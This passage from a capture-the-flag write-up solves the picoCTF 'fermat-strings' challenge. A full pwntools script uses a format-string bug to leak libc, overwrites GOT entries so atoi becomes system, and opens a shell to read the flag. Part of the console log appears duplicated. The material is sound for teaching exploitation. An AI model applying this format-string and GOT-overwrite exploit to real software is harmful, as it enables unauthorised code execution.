    b'1___%2080c%43$lln%9c%44$hhn'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  40 10 60 00  00 00 00 00  │1___│____│@·`·│····│
    00000010  42 10 60 00  00 00 00 00                            │B·`·│····│
    00000018
[*] Received:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000820  20 20 20 20  20 20 20 20  d2                        │    │    │·│
    00000829
[*] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: $ 1
B: $ 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: $ 2
B: $ 2
Calculating for A: 2 and B: 2
Welcome to Fermat\'s Last Theorem as a service
```
As we can see, instead of performing the calculation, we keep jumping back to `main`.
At this point we have a leak allowing us to calculate the LibC base, and we have a loop allowing us to exploit the format string vulnerability again. The last part of the exploit is to overwrite some other function address with the address of `system`. We'll override `atoi`. This means that if we provide `/bin/sh` as one of the inputs, when the program calls `a = atoi(A)` it will actually be calling `system("/bin/sh")` - giving us a shell.
Putting it all together, we get:
```python
# First, generate a pwntools template with:
#  pwn template --host mars.picoctf.net --port 31929 ./chall
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)
def send_format(io, format, values):
    format_prefix = b'111_'
    values_prefix = b'1111111_'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res
if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
io = start()
log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")
fmt_first_offset = 43
loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset + 2, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 0x25)
io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii") + loop_main_fmt, p64(exe.got["puts"]) + p64(exe.got["atoi"]) + loop_main_address)
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")
libc.address = puts_addr - libc.symbols["puts"]
assert(libc.address & 0xFFF == 0)
log.info(f"LibC base address: {hex(libc.address)}")
atoi_to_system_fmt, atoi_to_system_address = fmtstr_split(fmt_first_offset, {exe.got["atoi"]: libc.symbols["system"]}, numbwritten = 0x17)
send_format(io, atoi_to_system_fmt, atoi_to_system_address)
send_payload(io, "/bin/sh", "dummy")
io.interactive()
```
This script combines the main building blocks we saw earlier, with some minor adjustments for performing the steps together instead of discretely. The output we get is:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/media/sf_CTFs/pico/fermat-strings/libc6_2.31-0ubuntu9.1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] puts() GOT address: 0x601018
[*] atoi() GOT address: 0x601058
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'111_%43$s.%44$s.%2066c%45$lln%9c%46$hhn'
    B:
    00000000  31 31 31 31  31 31 31 5f  18 10 60 00  00 00 00 00  │1111│111_│··`·│····│
    00000010  58 10 60 00  00 00 00 00  40 10 60 00  00 00 00 00  │X·`·│····│@·`·│····│
    00000020  42 10 60 00  00 00 00 00                            │B·`·│····│
    00000028
[*] Received:
    00000000  a0 55 2d a9  c4 7f 2e 30  57 29 a9 c4  7f 2e 20 20  │·U-·│··.0│W)··│·.  │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000820  20 20 20 20  20 20 20 20  ae                        │    │    │·│
    00000829
[*] puts() runtime address: 0x7fc4a92d55a0
[*] atoi() runtime address: 0x7fc4a9295730
[*] LibC base address: 0x7fc4a924e000
[*] Sending:
    A:
    b'111_%249c%43$lln%26c%44$hhn%10c%45$hhn%75c%46$hhn%42c%47$hhn%27c%48$hhn'
    B:
    00000000  31 31 31 31  31 31 31 5f  58 10 60 00  00 00 00 00  │1111│111_│X·`·│····│
    00000010  5a 10 60 00  00 00 00 00  59 10 60 00  00 00 00 00  │Z·`·│····│Y·`·│····│
    00000020  5d 10 60 00  00 00 00 00  5b 10 60 00  00 00 00 00  │]·`·│····│[·`·│····│
    00000030  5c 10 60 00  00 00 00 00                            │\·`·│····│
    00000038
[*] Received:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
[*] Received:
    00000000  a0 55 2d a9  c4 7f 2e 30  57 29 a9 c4  7f 2e 20 20  │·U-·│··.0│W)··│·.  │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000820  20 20 20 20  20 20 20 20  ae                        │    │    │·│
    00000829
[*] puts() runtime address: 0x7fc4a92d55a0
[*] atoi() runtime address: 0x7fc4a9295730
[*] LibC base address: 0x7fc4a924e000
[*] Sending:
    A:
    b'111_%249c%43$lln%26c%44$hhn%10c%45$hhn%75c%46$hhn%42c%47$hhn%27c%48$hhn'
    B:
    00000000  31 31 31 31  31 31 31 5f  58 10 60 00  00 00 00 00  │1111│111_│X·`·│····│
    00000010  5a 10 60 00  00 00 00 00  59 10 60 00  00 00 00 00  │Z·`·│····│Y·`·│····│
    00000020  5d 10 60 00  00 00 00 00  5b 10 60 00  00 00 00 00  │]·`·│····│[·`·│····│
    00000030  5c 10 60 00  00 00 00 00                            │\·`·│····│
    00000038
[*] Received:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000f0  20 20 20 20  20 20 20 20  d8 20 20 20  20 20 20 20  │    │    │·   │    │
    00000100  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000110  20 20 8e 20  20 20 20 20  20 20 20 20  00 20 20 20  │  · │    │    │·   │
    00000120  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000160  20 20 20 20  20 20 20 ff  20 20 20 20  20 20 20 20  │    │   ·│    │    │
    00000170  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000190  20 90 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │ ·  │    │    │    │
    000001a0  20 20 20 20  20 20 20 20  20 20 20 20  e8           │    │    │    │·│
    000001ad
[*] Sending:
    A:
    /bin/sh
    B:
    00000000  64 75 6d 6d  79                                     │dumm│y│
    00000005
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
```
The flag: `picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}`